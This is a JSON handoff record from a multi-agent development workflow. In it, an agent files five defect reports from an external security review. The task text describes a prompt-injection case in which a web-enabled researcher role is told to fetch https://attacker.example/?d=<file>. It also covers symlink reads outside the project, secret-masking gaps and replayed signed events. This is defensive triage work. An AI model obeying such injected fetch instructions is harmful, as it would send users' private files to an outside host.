@@ -1,0 +1,154 @@
+{
+  "handoff_id": "step01-SECREG-20261118-01",
+  "run_id": "SECREG-20261118-01",
+  "workflow_id": "WF-03",
+  "step": "01",
+  "from_agent": "ORCH",
+  "to_agent": "DOC-UPDATER",
+  "file": "handoffs/SECREG-20261118-01/step-01-doc-updater.json",
+  "status": "COMPLETED",
+  "priority": "NORMAL",
+  "context": {
+    "requirement_ids": [],
+    "agent_run_id": "acd4e7e4600f63970",
+    "artifacts_in": [
+      "the relayed review text (in the task)",
+      "docs/workflows/WF-03-defect.md («The file»)",
+      "docs/issues/ (the recent files as samples)",
+      "docs/program/public-v1/PROGRESS.md (rows EXT-1 … EXT-5)"
+    ],
+    "route": "ORCH 0 (numbers) -> DOC-UPDATER 1 (this, the files) -> ORCH checks -> one WF-03 run per defect, in the order ISS-0119 … ISS-0123",
+    "write_set": [
+      "docs/issues/ISS-0119-…md … ISS-0123-…md (new)",
+      "its own handoff"
+    ],
+    "base_tag": "base/SECREG-20261118-01",
+    "parallel_work_now": [
+      "ISS-0092-20261117-01 step 04b CODE-FIXER (tools/src, the hook, package files, check.yml, tools/README.md, pre-push)"
+    ],
+    "orch_check": {
+      "at": "2026-11-18T15:36:27Z",
+      "by": "ORCH",
+      "verdict": "PASS",
+      "checked": [
+        "status COMPLETED, completed_at 2026-11-18T15:33:57Z, result.status COMPLETED; agent_run_id acd4e7e4600f63970 (ORCH)",
+        "git status --short docs/issues -> exactly the five new files ISS-0119 … ISS-0123; no other project file changed by the step",
+        "issues I1-I8 -> decisions/0121 (О1 language by 0080; О2 ISS-0120 with ISS-0037; О3 four accepted risks need the owner's word; О4 note replay in ISS-0123; О5 the comment and the advice; О6 order; О7 the STORE_TEXT default)",
+        "next: the owner's answers (О3, О7); ISS-0120 (with ISS-0037) starts at the next free slot after the queued M0 steps"
+      ]
+    }
+  },
+  "task": {
+    "description": "WF-03, step 0 (the record of new defects; ORCH gave the numbers) — DOC-UPDATER writes five new defect files in docs/issues/ by the format of docs/workflows/WF-03-defect.md («The file») and the sample of the existing files (first line «# ISS-NNNN — <title>», second line «Серьёзность: … Статус: open. Найдено: … Пункт планки: …», then the sections the recent files have; text in Russian as the other defect files). Source: an external security review of Sai, relayed to ORCH on 2026-11-18 by another local Claude session of the owner as the owner's word; the reviewer used only artificial values and localhost; nothing real leaked. Write the review's statements as statements of the review («по словам проверки»), not as facts: check yourself, by reading only, that every file and line the review names exists and holds what it says, and write in the file what you saw (or the difference); the diagnosis is ISSUE-FIXER's work in each defect's own WF-03 run. «Найдено: внешняя проверка безопасности (передано ORCH 2026-11-18 другой сессией владельца)»; no name of the reviewer, no other project, no machine path. Severity as proposed by ORCH (the diagnosis may change it): ISS-0119 HIGH, ISS-0120 HIGH, ISS-0121 MEDIUM, ISS-0122 MEDIUM, ISS-0123 LOW; the quality-bar item you choose from docs/quality-bar.md with its reason. Order and content: (1) ISS-0119 — prompt-injection exfiltration through the researcher role (not reproduced on a model): tools/src/team/role-internal.js line 24 gives the researcher file tools plus WebSearch and WebFetch; tools/src/team/executors/claude-cli.js lines 31-37 deny only local addresses (a deny list); data can leave in the URL of a plain GET. Acceptance proposed by the review: a role that reads untrusted text and has network tools cannot read anything outside its run's project root, and WebFetch is an allow list (deny by default), or the roles are split (a web role without file access, a file role without network); a test pins the launch arguments of every role with web tools; a test with an injection text asking to fetch https://attacker.example/?d=<file> shows the domain is refused. (2) ISS-0120 — a symlinked source read outside the project: a docs/context.md planted as a link to a file outside the project was copied by prepare-run into the run materials; git stores symlinks, so a cloned foreign repository is enough. Acceptance: prepare-run resolves the real path of every source it reads and refuses, with a named message and a non-zero exit, any file whose real path is outside the project root; a test with a link to an outside file: refused, the contents absent from the run materials; a link inside the root still works. (3) ISS-0121 — the secret masking misses: tools/src/pixel-office/mask.js and the second masking function (the review says «both functions»; find which one it means and name it) miss `password = \"...\"` (spaces around =) and `redis://:secret@host`, while `password=\"...\"` is caught. Acceptance: both functions mask key = value with any spaces around = and :, and any scheme://user:pass@host and scheme://:pass@host; the old cases stay masked; benign twins (no secret) are not changed. (4) ISS-0122 — local read APIs without a token: GET /api/events of tools/src/pixel-office/server.js and GET /api/projects of tools/src/web/api.js answer 200 with stored text to any local process; request texts are stored by default (SAI_PIXEL_OFFICE_STORE_TEXT); the servers listen on 127.0.0.1 and a foreign Host gets 403. Acceptance: the read endpoints of Pixel Office and Team Web need a per-start random token (in a file readable only by the owner, mode 0600) or the existing page key; without it 401 or 403; the page still works in the browser; lower risk on a one-person computer, matters on a shared one; an owner question: the default of SAI_PIXEL_OFFICE_STORE_TEXT. (5) ISS-0123 — replay of a signed event: the same signed POST /api/events sent twice got 204 twice and two journal lines; the HMAC and the time check pass, uniqueness is not checked. Acceptance: a second request with the same event id or nonce inside the time window is refused (for example 409), the journal has one line; a test pins it. In each file also: the review's good measures it named (HMAC on writes, Origin and page-key checks, CSP, no shell, a trimmed environment, budget and timeouts, no runtime npm dependencies, no sign of hidden sending) only where they bear on that defect; the review's advice for now (a separate virtual machine with depersonalised data, SAI_TEAM_WEB=0, SAI_PIXEL_OFFICE_STORE_TEXT=0) in ISS-0119 and ISS-0122; the open question to the reviewer (which part of the code was reviewed, whether anything was checked on Windows). SAFETY: read only — do not run any program of tools/, do not start Pixel Office, its hook or a team server, never set SAI_TEAM_REAL_RUNS, never start the real claude, never import a program file to read it, never touch the real Pixel Office state folder; a command denied by the permission check is not done another way. Change no project file other than the five new files docs/issues/ISS-0119-…md … ISS-0123-…md and this handoff (no STATE.md, no PLAN.md, no requirements, no other defect file); no commit, push or pull. The files and the handoff hold no absolute machine paths, no temporary paths and no names of other projects of the owner; run node src/handoffs/cli.js and node src/traces/cli.js from tools/ before close (both 0).",
+    "acceptance_criteria": [
+      "five files ISS-0119 … ISS-0123 in the format of WF-03 «The file» and of the recent defect files, in Russian",
+      "the review statements written as statements; each named file and line checked by reading, what was seen written",
+      "nothing else changed; no machine path, no other project, no reviewer name; handoffs-check and traces 0"
+    ]
+  },
+  "created_at": "2026-11-18T15:14:02Z",
+  "started_at": "2026-11-18T15:14:02Z",
+  "completed_at": "2026-11-18T15:33:57Z",
+  "result": {
+    "status": "COMPLETED",
+    "summary": "Five new defect files written in docs/issues/ under the numbers ORCH reserved (PROGRESS, rows EXT-1 … EXT-5): ISS-0119 HIGH (the Researcher's web tools and a GET address that can carry data out), ISS-0120 HIGH (prepare-run copies a linked source from outside the project), ISS-0121 MEDIUM (maskSecrets and findSecrets miss a spaced pair and an address with no user), ISS-0122 MEDIUM (the read APIs of Pixel Office and the team page answer any local process; request texts stored by default), ISS-0123 LOW (a replayed signed POST /api/events is appended twice). Each file writes the review's words as the review's statements, then what this step saw by reading every named file and line as text: all named places match the review (claude-cli.js lines 31-37: the comment is line 31, the five rules lines 33-37, the array closes on line 38). None of the named files differs from the tag base/SECREG-20261118-01, so the parallel run moved no named line; only tools/src/cli.js (not named by the review) moved the prepare-run handler from line 63 to 64. Found on the way and written into the files: ISS-0120 has the same cause as the open ISS-0037; four of the five findings are already recorded as accepted residual risks (decisions/0015 line 51; REQ-102 risk (5) and decisions/0105 item 6; decisions/0025 W2 line 48; design REQ-001 section 7.3 F2); by reading, POST /api/note accepts a captured signed body at any later time (ISS-0123). Nothing was run except the two record checks; no other project file was changed.",
+    "changes": [
+      {
+        "file": "docs/issues/ISS-0119-team-researcher-web-tools-can-send-data-out-in-get-address.md",
+        "what": "new defect file: header (HIGH, open, found by the external review, Q11 and Q7, REQ-010, decisions/0015 line 51), «Что не так» (the review's statements; what was seen in role-internal.js lines 6-9, 22-25 and claude-cli.js lines 31-38, 54-85, 87-95, 200-210; the accepted residual risk in 0015, design REQ-010 section 11, tools/README.md line 379; the good measures; the advice for now with SAI_TEAM_WEB read by the code), «Доказательство», «Как исправить» (the review's acceptance as a proposal to be measured; the decision record first), «Маршрут» (with the open question to the reviewer)"
+      },
+      {
+        "file": "docs/issues/ISS-0120-prepare-run-copies-a-linked-source-from-outside-the-project.md",
+        "what": "new defect file: header (HIGH, open, Q7, REQ-002, the same cause as the open ISS-0037), what was seen in prepare.js lines 71, 89-157, contract.js lines 33, 64-68, util.js lines 55-62; docs/context.md absent and no tracked link; runs/ tracked in git and the repository open (decisions/0111); the review's acceptance and the stricter ISS-0037 proposal; route together with ISS-0037"
+      },
+      {
+        "file": "docs/issues/ISS-0121-mask-rules-miss-a-spaced-pair-and-an-address-with-no-user.md",
+        "what": "new defect file: header (MEDIUM, open, Q7, REQ-008, REQ-102, decisions/0013 and 0105 item 6, related ISS-0097, ISS-0058, ISS-0045); the second function named by reading as findSecrets (mask.js line 1031) beside maskSecrets (line 283); what was seen in M9 lines 219-240 (line 229), M3 lines 61-85 (line 74), F9 lines 996-1027 (line 1013), F3 lines 804-835 (line 819); the named residual risk (5) of REQ-102, 0105 item 6 and tools/README.md line 253"
+      },
+      {
+        "file": "docs/issues/ISS-0122-local-read-apis-answer-any-local-process-without-a-token.md",
+        "what": "new defect file: header (MEDIUM, open, Q7, REQ-001, REQ-008, REQ-011, decisions/0025 W2 and 0011, the owner question on the default of SAI_PIXEL_OFFICE_STORE_TEXT); what was seen in pixel-office/server.js lines 221-259, 281-292, 430-452, 504, protocol.js lines 80-84 and 227, web/api.js lines 106-114, web/server.js lines 161-171, 240-251, 327-347, 428-479; the page key given by GET / (0025 W2 line 48); the header comment of web/server.js lines 2-3 that says more than the code; the good measures; the advice for now"
+      },
+      {
+        "file": "docs/issues/ISS-0123-pixel-office-accepts-a-replayed-signed-event.md",
+        "what": "new defect file: header (LOW, open, R2, REQ-001, REQ-008, design REQ-001 section 7.3 F2); what was seen in server.js lines 281-292, 306-316, 321-331, protocol.js lines 213-236, schema.js lines 18-38 and 67; the accepted risk in design REQ-001 lines 3097-3105; the place of the same kind POST /api/note (server.js lines 337-393, protocol.js lines 258 and 274-279), by reading only"
+      },
+      {
+        "file": "handoffs/SECREG-20261118-01/step-01-doc-updater.json",
+        "what": "status PENDING -> IN_PROGRESS at the start; result filled; status and completed_at set by the close command"
+      }
+    ],
+    "self_check": [
+      "git status --short docs/issues handoffs/SECREG-20261118-01 -> five new files ?? docs/issues/ISS-0119-…, ISS-0120-…, ISS-0121-…, ISS-0122-…, ISS-0123-…, and ?? handoffs/SECREG-20261118-01/; no other file of the project was touched by this step (the other changes of the working tree were there at the start of the step: git status at 2026-11-18T15:16:33Z)",
+      "the form of each file: line 1 «# ISS-NNNN — …»; line 3 «Серьёзность: HIGH|HIGH|MEDIUM|MEDIUM|LOW … Статус: open … Пункт планки: Q11|Q7|Q7|Q7|R2 …»; grep -c of the four section titles «Что не так», «Доказательство», «Как исправить», «Маршрут» -> 4 in each of the five files",
+      "git diff base/SECREG-20261118-01 -- <file> | wc -l -> 0 for each of tools/src/team/role-internal.js, team/executors/claude-cli.js, team/executor.js, team/config.js, pixel-office/mask.js, pixel-office/server.js, pixel-office/protocol.js, pixel-office/public/schema.js, pixel-office/hook.js, pixel-office/config.js, web/api.js, web/server.js, prepare.js, contract.js, util.js",
+      "git show base/SECREG-20261118-01:tools/src/cli.js | grep -n prepare-run handler -> 63; the same grep on the working file -> 64 (git diff of cli.js: +3 lines, the Node floor import and call)",
+      "git show base/SECREG-20261118-01:tools/README.md | grep -n -> line 379 (the leak of the task context through the address) and line 337 (SAI_TEAM_WEB=0); the working file gives line 253 for «space before the sign» and «address with no user», the same line at the tag",
+      "ls docs/context.md -> No such file or directory; git ls-files -s | awk mode 120000 | wc -l -> 0; git ls-files runs | wc -l -> 55",
+      "the files of docs/issues/ were searched for ISS-0037 class: grep -il of prepare-run, WebFetch, replay, /api/events, /api/projects -> ISS-0037 (the same cause as ISS-0120, open), ISS-0002, ISS-0003, ISS-0068, ISS-0069, ISS-0115 (other subjects)",
+      "search for the names of other projects and computer paths in the five new files -> empty",
+      "cd tools && node src/handoffs/cli.js -> «handoffs-check: файлов проверено 1438, нарушений 0, исключений использовано 110 из 110», exit 0",
+      "cd tools && node src/traces/cli.js -> «traces: файлов проверено 2624, следов 0, пропущено 67», exit 0",
+      "safety: only text commands (cat, sed, grep, awk, git show, git diff, git ls-files, ls, date) and the two record checks were run; no program file was imported; Pixel Office, its hook, the team server and the real claude were not started; SAI_TEAM_REAL_RUNS was not set; the real Pixel Office state folder was not touched; no command was denied by the permission check"
+    ],
+    "issues": [
+      {
+        "id": "I1",
+        "kind": "DISCREPANCY",
+        "text": "Language. The task says «text in Russian as the other defect files». The recent defect files (ISS-0092 … ISS-0118) have English text with the Russian field names, header values and section titles of WF-03; the Russian bodies are the files before decisions/0080 (for example ISS-0085). decisions/0080, item 2: «New decisions, handoffs, issues and reports are written in English from now on». A recorded decision is above the task (CLAUDE.md; quality-bar §6, item 7), and the measured sample agrees with it, so the five files follow the recent sample: an English title line, the Russian header line (Серьёзность, Статус, Найдено, Пункт планки, Требования, Решение) and the Russian section titles, English text, and the Russian quotations of Sai files kept with a short English gloss. If ORCH wants Russian bodies, that is a change of 0080 by the owner."
+      },
+      {
+        "id": "I2",
+        "kind": "DISCREPANCY",
+        "text": "ISS-0120 has the same cause as the open defect docs/issues/ISS-0037-prepare-run-reads-sources-through-symlink.md (LOW, open since 2026-10-11, the same reading through readTextFile for ideas/<id>.md and --context; decisions/0042 sent it to a separate defect). The new fact of the review is the way the link arrives (a cloned repository), which removes the reason ISS-0037 gave for LOW. ISS-0037 was not changed (not in the write set). Proposal: one WF-03 run fixes both; ORCH decides how ISS-0037 is closed and whether its severity is raised."
+      },
+      {
+        "id": "I3",
+        "kind": "DISCREPANCY",
+        "text": "Four of the five findings are recorded today as accepted residual risks, so their fixes change a recorded decision or an accepted risk (quality-bar §6, item 7; Q12) and need the owner before the design: ISS-0119 — decisions/0015 line 51, design REQ-010 section 11 line 868, tools/README.md line 379; ISS-0121 — REQ-102 rules Ф3 and Ф9 and residual risk (5), decisions/0105 item 6, tools/README.md line 253, the REQ-102 status note «(4)–(6) приняты владельцем 2026-10-28»; ISS-0122 — decisions/0025 W2 line 48 and design REQ-011 line 879 (plus design REQ-001 line 3085 and decisions/0011 for the stored text); ISS-0123 — design REQ-001 section 7.3 lines 3097-3105 (F2, accepted, with a proposed strengthening). ISS-0120 has no acceptance (0042 excluded the read). Each file says this in «Как исправить»."
+      },
+      {
+        "id": "I4",
+        "kind": "FINDING",
+        "text": "A place of the same kind as ISS-0123, wider than the review's (AP-014), seen by reading only: POST /api/note (tools/src/pixel-office/server.js lines 337-393) goes through the same signedObject; its body may not carry a time (protocol.js line 258, has_time) and the only time check is that request_time is not more than 60 s in the future (lines 274-279), so a captured signed note body would be accepted at any later moment, each time as a new ORCH record with a new time. Written into ISS-0123 as «by reading, not run»; it may raise the severity of ISS-0123. ORCH decides whether it stays in ISS-0123 or gets its own number."
+      },
+      {
+        "id": "I5",
+        "kind": "INFO",
+        "text": "«Both functions» of ISS-0121 is read as maskSecrets (mask.js line 283) and findSecrets (line 1031), the only two independent rule sets; prepareText (line 294), maskField (protocol.js line 74) and maskedArgs (team/engine/channel.js line 320) only call maskSecrets. The file asks the reviewer to confirm."
+      },
+      {
+        "id": "I6",
+        "kind": "DISCREPANCY",
+        "text": "tools/src/web/server.js, header comment lines 2-3, says «the checks of Host, Origin and the key of the page before any read of data», while the code (lines 462-465 and 473) and the design REQ-011 section 4.1 item 3 («Только для POST») check Origin and the key only for POST. A comment that says more than the code; written into ISS-0122 for the diagnosis, not a separate defect."
+      },
+      {
+        "id": "I7",
+        "kind": "INFO",
+        "text": "The review's advice SAI_TEAM_WEB=0 turns off WebSearch and WebFetch of the Researcher (tools/src/team/config.js line 85, executor.js lines 329-332, tools/README.md line 337); it does not stop the team page, which serves only while npm run team-web runs. Written so in ISS-0119 and ISS-0122, so that the owner does not read it as «the team page is off»."
+      },
+      {
+        "id": "I8",
+        "kind": "INFO",
+        "text": "The review's acceptance items are written in each file as proposals to be measured, not as ready fixes (AP-161). For ISS-0122 the option «the existing page key» does not close a local read by itself: the key is given in index.html to anyone who passes the Host check (web/server.js lines 240-251; decisions/0025 W2)."
+      },
+      {
+        "id": "I9",
+        "kind": "INFO",
+        "text": "The relay is the owner's word to be confirmed in the ORCH session (orch_note of this handoff; PROGRESS row of 2026-11-18T15:01:53Z); each file writes the review's words as statements of the review and its own reading separately, so the files stay true if the owner changes the scope."
+      }
+    ],
+    "artifacts_out": [
+      "docs/issues/ISS-0119-team-researcher-web-tools-can-send-data-out-in-get-address.md",
+      "docs/issues/ISS-0120-prepare-run-copies-a-linked-source-from-outside-the-project.md",
+      "docs/issues/ISS-0121-mask-rules-miss-a-spaced-pair-and-an-address-with-no-user.md",
+      "docs/issues/ISS-0122-local-read-apis-answer-any-local-process-without-a-token.md",
+      "docs/issues/ISS-0123-pixel-office-accepts-a-replayed-signed-event.md"
+    ]
+  },
+  "orch_note": {
+    "by": "ORCH",
+    "at": "2026-11-18T15:14:02Z",
+    "text": "Launched as a general agent bound by its role file .claude/agents/doc-updater.md (read first): the Sai role agents are not registered in this ORCH session. The numbers ISS-0119 … ISS-0123 were reserved by ORCH in PROGRESS (table «Finding → defect», rows EXT-1 … EXT-5); the request was relayed by another local session of the owner as his word and is to be confirmed by the owner in this session."
+  }
+}
